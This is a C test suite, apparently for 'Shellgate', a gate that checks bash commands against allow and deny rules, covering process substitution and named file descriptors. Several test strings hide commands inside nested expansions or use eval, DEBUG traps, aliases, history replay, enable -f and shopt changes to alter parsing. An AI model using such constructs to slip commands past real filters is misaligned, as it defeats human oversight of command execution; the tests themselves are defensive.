  ASSERT(strcmp(diagnostic, "parse error") == 0);

  static const char *const whitespace_function_declarations[] = {
      "foo () { echo x; }",          "foo ( ) { echo x; }",
      "foo\t(\t) ( echo x )",        "foo\\\n() { echo x; }",
      "function foo () { echo x; }", "function foo ( ) ( echo x )",
  };
  for (size_t i = 0; i < sizeof(whitespace_function_declarations) /
                             sizeof(whitespace_function_declarations[0]);
       i++) {
    memset(&result, 0, sizeof(result));
    memset(diagnostic, 0, sizeof(diagnostic));
    ASSERT(sg_gate_evaluate(g, whitespace_function_declarations[i],
                            strlen(whitespace_function_declarations[i]),
                            diagnostic, sizeof(diagnostic),
                            &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT && !result.truncated);
    ASSERT(strcmp(diagnostic, "parse error") == 0);
  }

  ASSERT(eval_with_prefix(g, "{ echo x; }", 4, &result) == SG_ERR_TRUNC);
  ASSERT(result.truncated);
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  sg_gate_free(g);
}

/* --- FEATURE REJECTION --- */

TEST(conditional_substitution_matrix) {
  static const struct {
    const char *command;
    const char *outer_rule;
    const char *inner_rule;
    sg_verdict_t expected;
    bool conditional;
    uint32_t reject_mask;
    bool deny_inner;
  } cases[] = {
      {"echo $(whoami)", "echo *", "whoami", SG_VERDICT_ALLOW_CONDITIONAL, true,
       0, false},
      {"cat <(whoami)", "cat *", "whoami", SG_VERDICT_ALLOW, false, 0, false},
      {"echo $(whoami)", "echo *", NULL, SG_VERDICT_UNDETERMINED, true, 0,
       false},
      {"echo $(whoami)", "echo *", "whoami", SG_VERDICT_REJECT, false,
       (1u << 2), false},
      {"echo $(whoami)", "echo *", "whoami", SG_VERDICT_DENY, true, 0, true},
      {"echo \"${v#${u:-$'$(printf child)'}}\"", "echo *", "printf child",
       SG_VERDICT_DENY, true, 0, true},
      {"echo \"${v/x/${u:+$'$(printf child 2>&1)'}}\"", "echo *",
       "printf child", SG_VERDICT_DENY, true, 0, true},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = sg_gate_new();
    ASSERT(g != NULL);
    ASSERT_ST_OK(test_policy_replace_cpl(g, false, cases[i].outer_rule, false));
    if (cases[i].inner_rule) {
      if (cases[i].deny_inner)
        ASSERT_ST_OK(
            test_policy_replace_cpl(g, true, cases[i].inner_rule, false));
      else
        ASSERT_ST_OK(
            test_policy_replace_cpl(g, false, cases[i].inner_rule, false));
    }
    if (cases[i].reject_mask)
      ASSERT_SG_OK(sg_gate_set_reject_mask(g, cases[i].reject_mask));
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(g, cases[i].command, &result));
    ASSERT(result.verdict == cases[i].expected);
    ASSERT(result.requires_substitution_evaluation == cases[i].conditional);
    if (cases[i].reject_mask == 0)
      ASSERT(result.has_dynamic_substitution_io);
    if (cases[i].conditional) {
      ASSERT(result.subcommand_count >= 2);
      bool dynamic_consumer = false;
      for (uint32_t j = 0; j < result.subcommand_count; j++)
        dynamic_consumer |=
            result.subcommands[j].requires_substitution_evaluation;
      ASSERT(dynamic_consumer);
    }
    sg_gate_free(g);
  }
}

TEST(process_substitution_wildcard_policy) {
  static const char *const rules[] = {"cat", "cat *", "sort", "sort *",
                                      "cat #path"};
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  for (size_t i = 0; i < sizeof(rules) / sizeof(rules[0]); i++)
    ASSERT_ST_OK(test_policy_replace_cpl(gate, false, rules[i], false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "sort <(cat /tmp/a)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.subcommands[0].matches);
  ASSERT(result.subcommands[0].verdict == SG_VERDICT_ALLOW);
  ASSERT(result.has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "cat <(sort <(cat /tmp/a))", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 3);
  ASSERT(result.subcommands[1].matches);
  ASSERT(result.subcommands[1].verdict == SG_VERDICT_ALLOW);
  sg_gate_free(gate);
}

/* A named descriptor allocation is not an outer-command write by itself.
 * Shellgate should still evaluate every executable stage, preserve the
 * ordinary process-substitution dynamic-I/O marker, and allow the later exact
 * `$name` descriptor use to carry the payload to its consumer. */
TEST(named_fd_process_substitution_policy_contract) {
  static const char command[] =
      "exec {sink}> >(cat); printf payload >&\"${sink}\"";
  sg_gate_t *gate = gate_with_rules(
      (const char *[]){"exec", "cat", "producer", "printf *", ": *"}, 5);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));

  sg_result_t result = {0};
  for (size_t pass = 0; pass < 3; pass++) {
    ASSERT_SG_OK(eval_cmd(gate, command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
    ASSERT(result.subcommand_count == 3);
    ASSERT(result.has_dynamic_substitution_io);
    ASSERT(!result.requires_substitution_evaluation);
    ASSERT(!result.subcommands[0].has_dynamic_substitution_io);
    ASSERT(result.subcommands[1].has_dynamic_substitution_io);
    ASSERT(!result.subcommands[2].has_dynamic_substitution_io);
    ASSERT_STR(result.subcommands[2].netargv, "6:printf,7:payload,");
    if (pass == 0)
      ASSERT(isinf(result.anomaly_score));
    else
      ASSERT(isfinite(result.anomaly_score));
  }
  ASSERT(test_anomaly_vocabulary(gate) > 0);

  /* Input process substitution is retained as a named-FD setup until a later
   * exact `$source` use. Its producer-to-exec route is still represented
   * dynamic topology, but setup neither moves bytes nor asks the caller to
   * inspect data as code. */
  ASSERT_SG_OK(
      eval_cmd(gate, "exec {source}< <(producer); printf payload", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3 &&
         result.has_dynamic_substitution_io &&
         !result.requires_substitution_evaluation);
  bool source_setup_owner = false;
  bool source_producer = false;
  bool source_payload = false;
  for (uint32_t i = 0; i < result.subcommand_count; i++) {
    const sg_subcommand_result_t *subcommand = &result.subcommands[i];
    if (subcommand->display_command == NULL)
      continue;
    if (strcmp(subcommand->display_command, "exec") == 0)
      source_setup_owner = subcommand->has_dynamic_substitution_io &&
                           !subcommand->requires_substitution_evaluation;
    else if (strcmp(subcommand->display_command, "producer") == 0)
      source_producer = !subcommand->has_dynamic_substitution_io;
    else if (strncmp(subcommand->display_command, "printf", 6) == 0)
      source_payload = !subcommand->has_dynamic_substitution_io;
  }
  ASSERT(source_setup_owner && source_producer && source_payload);

  /* Both nested producers redirect their inherited stdout away. The retained
   * endpoint has no producer command edge, but the named input setup remains
   * dynamic topology and the later exact descriptor use supplies cat. */
  ASSERT_SG_OK(eval_cmd(gate,
                        "exec {source}< <(printf first >/tmp/source-first; "
                        "printf second >/tmp/source-second); cat <&\"$source\"",
                        &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 4 &&
         result.has_dynamic_substitution_io &&
         !result.requires_substitution_evaluation);
  uint32_t redirected_producers = 0;
  bool unconnected_source_setup = false;
  bool unconnected_source_consumer = false;
  for (uint32_t i = 0; i < result.subcommand_count; i++) {
    const sg_subcommand_result_t *subcommand = &result.subcommands[i];
    if (subcommand->display_command == NULL)
      continue;
    if (strcmp(subcommand->display_command, "exec") == 0)
      unconnected_source_setup = subcommand->has_dynamic_substitution_io;
    else if (strncmp(subcommand->display_command, "printf", 6) == 0) {
      redirected_producers++;
      ASSERT(!subcommand->has_dynamic_substitution_io);
    } else if (strcmp(subcommand->display_command, "cat") == 0)
      unconnected_source_consumer = subcommand->has_dynamic_substitution_io;
  }
  ASSERT(unconnected_source_setup && redirected_producers == 2 &&
         unconnected_source_consumer);

  /* The matching output form has setup topology but no nested stdin flow:
   * the nested cat supplied its own input. The result remains dynamically
   * structured, while no simple command is falsely reported as its byte-flow
   * consumer. */
  ASSERT_SG_OK(eval_cmd(gate,
                        "exec {sink}> >(cat </tmp/named-sink); "
                        "printf payload >&\"$sink\"",
                        &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3 &&
         result.has_dynamic_substitution_io &&
         !result.requires_substitution_evaluation);
  for (uint32_t i = 0; i < result.subcommand_count; i++)
    ASSERT(!result.subcommands[i].has_dynamic_substitution_io);

  /* Ordinary named file setup and descriptor duplication are not process
   * substitutions and must not inherit the dynamic-topology marker. */
  ASSERT_SG_OK(
      eval_cmd(gate, "exec {source}</tmp/input; printf payload", &result));
  ASSERT(!result.has_dynamic_substitution_io &&
         !result.requires_substitution_evaluation);
  ASSERT_SG_OK(eval_cmd(gate, "exec {source}<&0; printf payload", &result));
  ASSERT(!result.has_dynamic_substitution_io &&
         !result.requires_substitution_evaluation);

  /* The group body's exec allocation is visible when a later word starts a
   * nested shell. It must reach policy evaluation, not fail graph parsing. */
  ASSERT_SG_OK(eval_cmd(gate,
                        "{ exec {fd}</tmp/group-input; "
                        "printf '%s' \"$(cat <&$fd)\"; }",
                        &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
         result.subcommand_count == 3 &&
         result.requires_substitution_evaluation);

  /* A comment after the group's redirects cannot make its descriptor state
   * conditional merely by containing connector punctuation. */
  static const char *const commented_connectors[] = {
      "{ exec {fd}</tmp/group-input; } >/dev/null # && comment\n"
      "printf '%s' \"$(cat <&$fd)\"",
      "{ exec {fd}</tmp/group-input; } >/dev/null # || comment\n"
      "printf '%s' \"$(cat <&$fd)\"",
  };
  for (size_t i = 0;
       i < sizeof(commented_connectors) / sizeof(commented_connectors[0]);
       i++) {
    ASSERT_SG_OK(eval_cmd(gate, commented_connectors[i], &result));
    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
           result.requires_substitution_evaluation);
  }
  ASSERT_SG_OK(
      eval_cmd(gate, "echo `printf x; printf y`; printf done", &result));
  ASSERT(result.subcommand_count >= 3 &&
         result.requires_substitution_evaluation);

  ASSERT(sg_gate_evaluate(gate, "printf payload >&\"$missing\"",
                          strlen("printf payload >&\"$missing\""), eval_buf,
                          sizeof(eval_buf), &result) == SG_ERR_PARSE);
  /* A semantic parse rejection exposes Shellgate's documented one synthetic
   * result, never a partially evaluated executable command. */
  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
         result.subcommands[0].verdict == SG_VERDICT_REJECT &&
         strcmp(eval_buf, "parse error") == 0);

  /* A complete glob may expand to a descriptor number, so legacy `>&word`
   * must reject it rather than claiming combined file output. An unmatched
   * bracket is literal and therefore keeps a dynamic filename topology. */
  ASSERT(sg_gate_evaluate(gate, "printf payload >&[[:digit:]]",
                          strlen("printf payload >&[[:digit:]]"), eval_buf,
                          sizeof(eval_buf), &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
         result.subcommands[0].verdict == SG_VERDICT_REJECT &&
         strcmp(eval_buf, "parse error") == 0);
  ASSERT_SG_OK(sg_gate_evaluate(gate, "printf payload >&[$fd",
                                strlen("printf payload >&[$fd"), eval_buf,
                                sizeof(eval_buf), &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1 &&
         result.subcommands[0].verdict == SG_VERDICT_ALLOW &&
         strcmp(result.subcommands[0].netargv, "6:printf,7:payload,") == 0);

  /* The descriptor is not visible to a word expansion in the command which
   * allocates it. Under Bash's default `varredir_close` behavior, however, a
   * preceding ordinary command does retain an open named descriptor. */
  static const char *const snapshot_rejections[] = {
      "printf payload {fd}</tmp/in \"$(cat <&$fd)\"",
      "exec {fd}</tmp/in; exec {fd}<&-; printf payload \"$(cat <&$fd)\"",
      "printf > >(cat <&$fd) {fd}</tmp/in",
      ("shopt -s varredir_close; : {fd}</tmp/in; "
       "printf payload \"$(cat <&$fd)\""),
      ("x+=value shopt -u varredir_close; : {fd}</tmp/in; "
       "printf payload \"$(cat <&$fd)\""),
      ("x+\\\n=value shopt -s varredir_close; : {fd}</tmp/in; "
       "printf payload \"$(cat <&$fd)\""),
      ("sh'opt' '-s' varredir_close; : {fd}</tmp/in; "
       "printf payload \"$(cat <&$fd)\""),
      ("shopt -s lastpipe; printf source | : {fd}</tmp/in; "
       "printf payload \"$(cat <&$fd)\""),
      ("command shopt -u lastpipe; printf source | : {fd}</tmp/in; "
       "printf payload \"$(cat <&$fd)\""),
      ("eval 'shopt -s lastpipe'; printf source | : {fd}</tmp/in; "
       "printf payload \"$(cat <&$fd)\""),
      (". /tmp/shell-state; printf source | : {fd}</tmp/in; "
       "printf payload \"$(cat <&$fd)\""),
      ("command source /tmp/shell-state; printf source | : {fd}</tmp/in; "
       "printf payload \"$(cat <&$fd)\""),
      ("trap 'shopt -s lastpipe' DEBUG; printf source | : {fd}</tmp/in; "
       "printf payload \"$(cat <&$fd)\""),
      ("alias change_scope='shopt -s lastpipe'; "
       "printf source | : {fd}</tmp/in; printf payload \"$(cat <&$fd)\""),
      ("shopt -s expand_aliases; printf source | : {fd}</tmp/in; "
       "printf payload \"$(cat <&$fd)\""),
      ("history -s 'shopt -s lastpipe'; fc -s -1; "
       "printf source | : {fd}</tmp/in; printf payload \"$(cat <&$fd)\""),
      ("enable -f /tmp/shell-state change_scope; "
       "printf source | : {fd}</tmp/in; printf payload \"$(cat <&$fd)\""),
      /* Dynamic selectors can mutate current-shell POSIX mode or assign a
       * mode-changing variable. Shellgate must reject them before policy
       * evaluation, regardless of the eventual expansion value. */
      "set -o \"$option\"; printf payload",
      "shopt -s -o posix; printf payload",
      "shopt -so posix; printf payload",
      "command shopt -s -o posix; printf payload",
      "shopt -s -o \"$option\"; printf payload",
      "printf -v \"$target\" enabled; printf payload",
      ": $((fd1++)); printf payload",
      ": $(( $(printf 'fd=12') )); printf payload",
      "command pushd /tmp; printf payload",
      "builtin popd; printf payload",
      ("exec {fd}>/tmp/out; printf -v 'fd[0]' enabled; "
       "printf payload >&$fd"),
      ("exec {fd}>/tmp/out; read -a fd; printf payload >&$fd"),
      ("exec {fd}>/tmp/out; wait -p fd; printf payload >&$fd"),
      ("exec {fd}>/tmp/out; : $((fd=9)); printf payload >&$fd"),
      "mapfile -c 1 -C 'printf callback' values </tmp/input; printf payload",
      ("exec {fd}>/tmp/readonly-first; readonly fd; "
       "exec {fd}>/tmp/readonly-second; printf payload >&$fd"),
      ("exec {fd}>/tmp/readonly-first; declare -r fd; "
       "exec {fd}>/tmp/readonly-second; printf payload >&$fd"),
      ("exec {fd}>/tmp/readonly-first; typeset -r fd; "
       "exec {fd}>/tmp/readonly-second; printf payload >&$fd"),
      ("exec {fd}>/tmp/readonly-first; command -p readonly fd; "
       "exec {fd}>/tmp/readonly-second; printf payload >&$fd"),
      ("( printf payload >&$fd ) {fd}>/tmp/subshell-out; "
       "printf payload >&$fd"),
      ("false && { :; exec {fd}</tmp/skipped; }; "
       "printf payload \"$(cat <&$fd)\""),
      ("true || { :; exec {fd}</tmp/skipped; }; "
       "printf payload \"$(cat <&$fd)\""),
  };
  for (size_t i = 0;
       i < sizeof(snapshot_rejections) / sizeof(snapshot_rejections[0]); i++) {
    ASSERT(sg_gate_evaluate(gate, snapshot_rejections[i],
                            strlen(snapshot_rejections[i]), eval_buf,
                            sizeof(eval_buf), &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           result.subcommand_count == 1 &&
           result.subcommands[0].verdict == SG_VERDICT_REJECT &&
           strcmp(eval_buf, "parse error") == 0);
  }

  static const char persisted_named_fd[] =
      "printf payload {fd}>/tmp/out; printf payload >&$fd";
  ASSERT_SG_OK(sg_gate_evaluate(gate, persisted_named_fd,
                                sizeof(persisted_named_fd) - 1, eval_buf,
                                sizeof(eval_buf), &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.subcommands[0].verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommands[1].verdict == SG_VERDICT_ALLOW);

  static const char *const adjacent_named_fd[] = {
      "exec {fd}>/dev/null; exec {fd}>&-{out}>/dev/null; printf payload >&$out",
      "exec {fd}</dev/null; exec {fd}<&-{out}</dev/null; cat <&$out",
      "exec 9>/dev/null; exec 9>&-{out}>/dev/null; printf payload >&$out",
      "exec 9</dev/null; exec 9<&-{out}</dev/null; cat <&$out",
  };
  for (size_t i = 0;
       i < sizeof(adjacent_named_fd) / sizeof(adjacent_named_fd[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, adjacent_named_fd[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3);
    ASSERT_STR(result.subcommands[0].netargv, "4:exec,");
    ASSERT_STR(result.subcommands[1].netargv, "4:exec,");
    ASSERT_STR(result.subcommands[2].netargv,
               i % 2 ? "3:cat," : "6:printf,7:payload,");
    ASSERT(!result.requires_substitution_evaluation &&
           !result.has_dynamic_substitution_io);
  }

  /* Descriptor identity erases backslash-LF, so a binding and its later
   * reference need not share one raw spelling. CR remains significant; the
   * cases below remain valid ordinary syntax without forming a named FD. */
  static const char *const continued_named_fd[] = {
      "exec {f\\\nd}>/tmp/lf-declaration; printf payload >&$fd",
      "exec {fd}>/tmp/lf-reference; printf payload >&$f\\\nd",
      "exec {fd}>/tmp/lf-braced-reference; printf payload >&\"${f\\\nd}\"",
      "exec {fd}>/tmp/dollar-lf-reference; printf payload >&$\\\n{fd}",
      "exec {fd}>/tmp/dollar-quoted-reference; printf payload >&\"$\\\n{fd}\"",
  };
  for (size_t i = 0;
       i < sizeof(continued_named_fd) / sizeof(continued_named_fd[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, continued_named_fd[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2 &&
           result.subcommands[0].verdict == SG_VERDICT_ALLOW &&
           result.subcommands[1].verdict == SG_VERDICT_ALLOW &&
           result.subcommands[1].write_count == 0);
  }
  static const char *const non_continued_named_fd[] = {
      ": {f\\\rd}>/tmp/bare-cr-out",
      ": {f\\\r\n: d}>/tmp/crlf-out",
  };
  for (size_t i = 0;
       i < sizeof(non_continued_named_fd) / sizeof(non_continued_named_fd[0]);
       i++) {
    ASSERT_SG_OK(eval_cmd(gate, non_continued_named_fd[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           result.subcommand_count == i + 1);
  }

  /* A persistent named-FD close is valid setup in its own right, but a later
   * exact descriptor use must fail graph resolution rather than be evaluated
   * against the retired binding. */
  static const char closed_named_fd[] =
      "exec {fd}>/tmp/closed-out; exec {fd}>&-";
  ASSERT_SG_OK(sg_gate_evaluate(gate, closed_named_fd,
                                sizeof(closed_named_fd) - 1, eval_buf,
                                sizeof(eval_buf), &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2 &&
         result.subcommands[0].verdict == SG_VERDICT_ALLOW &&
         result.subcommands[1].verdict == SG_VERDICT_ALLOW);

  static const char closed_named_fd_use[] =
      "exec {fd}>/tmp/closed-out; exec {fd}>&-; printf payload >&$fd";
  ASSERT(sg_gate_evaluate(gate, closed_named_fd_use,
                          sizeof(closed_named_fd_use) - 1, eval_buf,
                          sizeof(eval_buf), &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
         result.subcommands[0].verdict == SG_VERDICT_REJECT &&
         strcmp(eval_buf, "parse error") == 0);

  /* Assignment prefixes are temporary in Bash. Shellgate must not reject the
   * command by discarding the descriptor route before its redirect expands. */
  static const char prefixed_named_fd[] =
      "exec {fd}>/tmp/prefix-out; fd=shadow printf payload >&$fd; "
      "printf payload >&$fd";
  ASSERT_SG_OK(sg_gate_evaluate(gate, prefixed_named_fd,
                                sizeof(prefixed_named_fd) - 1, eval_buf,
                                sizeof(eval_buf), &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3 &&
         result.subcommands[1].verdict == SG_VERDICT_ALLOW &&
         result.subcommands[2].verdict == SG_VERDICT_ALLOW);

  static const char prefixed_append_named_fd[] =
      "exec {fd}>/tmp/prefix-append-out; fd+=shadow printf payload >&$fd; "
      "printf payload >&$fd";
  ASSERT_SG_OK(sg_gate_evaluate(gate, prefixed_append_named_fd,
                                sizeof(prefixed_append_named_fd) - 1, eval_buf,
                                sizeof(eval_buf), &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3 &&
         result.subcommands[1].verdict == SG_VERDICT_ALLOW &&
         result.subcommands[2].verdict == SG_VERDICT_ALLOW);

  /* An assignment-only command changes the descriptor variable instead. */
  static const char reassigned_named_fd[] =
      "exec {fd}>/tmp/reassigned-out; f\\\nd=shadow; printf payload >&$fd";
  ASSERT(sg_gate_evaluate(gate, reassigned_named_fd,
                          sizeof(reassigned_named_fd) - 1, eval_buf,
                          sizeof(eval_buf), &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
         result.subcommands[0].verdict == SG_VERDICT_REJECT &&
         strcmp(eval_buf, "parse error") == 0);

  static const char reassigned_append_named_fd[] =
      "exec {fd}>/tmp/reassigned-append-out; f\\\n"
      "d+=shadow; printf payload >&$fd";
  ASSERT(sg_gate_evaluate(gate, reassigned_append_named_fd,
                          sizeof(reassigned_append_named_fd) - 1, eval_buf,
                          sizeof(eval_buf), &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
         result.subcommands[0].verdict == SG_VERDICT_REJECT &&
         strcmp(eval_buf, "parse error") == 0);

  /* The policy surface receives canonical argv after quote removal, while the
   * graph must also preserve the current-shell numeric descriptor route. */
  static const char quoted_persistent_exec[] =
      "e'x'ec 3>/tmp/quoted-out; printf payload >&3";
  ASSERT_SG_OK(sg_gate_evaluate(gate, quoted_persistent_exec,
                                sizeof(quoted_persistent_exec) - 1, eval_buf,
                                sizeof(eval_buf), &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2 &&
         result.subcommands[0].verdict == SG_VERDICT_ALLOW &&
         result.subcommands[1].verdict == SG_VERDICT_ALLOW);
  ASSERT_STR(result.subcommands[0].netargv, "4:exec,");
  ASSERT_STR(result.subcommands[1].netargv, "6:printf,7:payload,");

  /* Shellgate's anomaly path builds canonical command sequences after graph
   * analysis. A group-tail symbolic duplication with whitespace must reach
   * both surfaces successfully, rather than becoming a late parse failure. */
  static const char grouped_whitespace_named_fd[] =
      "exec {sink}> >(cat); { printf payload; } >& \"${sink}\"";
  ASSERT_SG_OK(sg_gate_evaluate(gate, grouped_whitespace_named_fd,
                                sizeof(grouped_whitespace_named_fd) - 1,
                                eval_buf, sizeof(eval_buf), &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 3);
  ASSERT(result.has_dynamic_substitution_io);
  ASSERT(result.subcommands[2].verdict == SG_VERDICT_ALLOW);
  ASSERT_STR(result.subcommands[2].netargv, "6:printf,7:payload,");
  sg_gate_free(gate);
}

TEST(named_fd_builtin_mutation_redirect_policy_contract) {
  sg_gate_t *gate =
      gate_with_rules((const char *[]){"exec", "unset *", "read *", "printf *",
                                       "printf -v fd shadow", "cat *"},
                      6);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  static const char *const supported[] = {
      "exec {fd}>/tmp/mutation-output; unset fd >&$fd",
      "exec {fd}>/tmp/mutation-output; printf -v fd shadow >&$fd",
      "exec {fd}</tmp/mutation-input; read fd <&$fd",
  };
  sg_result_t result = {0};
  for (size_t i = 0; i < sizeof(supported) / sizeof(supported[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, supported[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2 &&
           result.subcommands[0].verdict == SG_VERDICT_ALLOW &&
           result.subcommands[1].verdict == SG_VERDICT_ALLOW);
  }

  static const char *const invalid_after[] = {
      "exec {fd}>/tmp/mutation-output; unset fd >&$fd; printf x >&$fd",
      "exec {fd}>/tmp/mutation-output; unset fd >&$fd && printf x >&$fd",
      "exec {fd}</tmp/mutation-input; read fd <&$fd; cat <&$fd",
      "exec {fd}>/tmp/mutation-output; fd=shadow >&$fd",
      "printf -v fd shadow {fd}>/tmp/mutation-output; printf x >&$fd",
      "printf -v fd shadow {fd}>/tmp/mutation-output && printf x >&$fd",
      "unset fd {fd}>/tmp/mutation-output; printf x >&$fd",
  };
  for (size_t i = 0; i < sizeof(invalid_after) / sizeof(invalid_after[0]);
       i++) {
    ASSERT(eval_cmd(gate, invalid_after[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           result.subcommand_count == 1 &&
           result.subcommands[0].verdict == SG_VERDICT_REJECT);
  }
  sg_gate_free(gate);
}

/* Static quote removal applies to descriptor-variable mutations too. Shellgate
 * must keep an unrelated named route usable while a dynamic target continues
 * to reject the graph before partially evaluating its command sequence. */
TEST(named_fd_builtin_operand_policy_contract) {
  sg_gate_t *gate =
      gate_with_rules((const char *[]){"exec", "read *", "read", "unset *",
                                       "printf *", "command *"},
                      6);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1000000.0, NULL));
  for (size_t i = 0; i < sizeof(shellsplit_test_builtin_routes) /
                             sizeof(shellsplit_test_builtin_routes[0]);
       i++) {
    sg_result_t result;
    sg_error_t status =
        eval_cmd(gate, shellsplit_test_builtin_routes[i].source, &result);
    if (shellsplit_test_builtin_routes[i].resolved) {
      if (status != SG_OK || result.verdict == SG_VERDICT_REJECT)
        fprintf(stderr, "builtin policy route case %zu failed: %s (%d, %d)\n",
                i, shellsplit_test_builtin_routes[i].source, status,
                result.verdict);
      ASSERT(status == SG_OK && result.verdict != SG_VERDICT_REJECT);
      /* A node-free cd transition can be omitted from the policy command
       * projection; exec and the following writer are still retained. */
      ASSERT(result.subcommand_count >= 2);
      ASSERT(result.subcommands[result.subcommand_count - 1].verdict ==
             SG_VERDICT_ALLOW);
      ASSERT_STR(result.subcommands[result.subcommand_count - 1].netargv,
                 "6:printf,1:x,");
    } else {
      ASSERT(status == SG_ERR_PARSE && result.verdict == SG_VERDICT_REJECT &&
             result.subcommand_count == 1);
    }
  }
  for (size_t i = 0; i < sizeof(shellsplit_test_assignment_snapshots) /
                             sizeof(shellsplit_test_assignment_snapshots[0]);
       i++) {
    sg_result_t result;
    sg_error_t error =
        eval_cmd(gate, shellsplit_test_assignment_snapshots[i].source, &result);
    ASSERT(error == (shellsplit_test_assignment_snapshots[i].resolved
                         ? SG_OK
                         : SG_ERR_PARSE));
    ASSERT(shellsplit_test_assignment_snapshots[i].resolved
               ? result.verdict != SG_VERDICT_REJECT && !result.truncated
               : result.verdict == SG_VERDICT_REJECT);
  }
  sg_gate_free(gate);
}

/* Exact rules ensure these are complete policy evaluations, not merely a
 * successful graph with an unrelated undetermined builtin. */
TEST(named_fd_builtin_ordered_assignment_policy_contract) {
  static const char *const rules[] = {
      "exec",
      "printf *",
      "printf -vfd -vother %s one",
      "printf -vother -vfd %s one",
      "printf -v fd",
      "printf -vfd -Z",
      "printf -v scratch \"%n\" other",
      "printf \"%%n\" fd",
      "printf \"%b%n\" \"\\\\c\" fd",
      "declare -p fd=changed",
      "declare bad-name",
      "declare bad-name fd=changed",
      "local fd=changed",
      "read UID fd",
      "read EUID fd",
  };
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1000000.0, NULL));
  static const char *const preserved[] = {
      ("exec {fd}>/tmp/builtin-route; printf -vfd -vother %s one >&$fd; "
       "printf x >&$fd"),
      "exec {fd}>/tmp/builtin-route; printf -v fd; printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; printf -vfd -Z; printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; declare -p fd=changed; printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; declare bad-name; printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; local fd=changed; printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; printf -v scratch '%n' other; "
      "printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; printf '%%n' fd; printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; printf '%b%n' '\\c' fd; printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; read UID fd <<<one; printf x >&$fd",
      "exec {fd}>/tmp/builtin-route; read EUID fd <<<one; printf x >&$fd",
  };
  sg_result_t result = {0};
  for (size_t i = 0; i < sizeof(preserved) / sizeof(preserved[0]); i++) {
    ASSERT_SG_OK(eval_cmd(gate, preserved[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3);
    for (size_t j = 0; j < result.subcommand_count; j++)
      ASSERT(result.subcommands[j].verdict == SG_VERDICT_ALLOW);
    ASSERT_STR(result.subcommands[2].netargv, "6:printf,1:x,");
  }
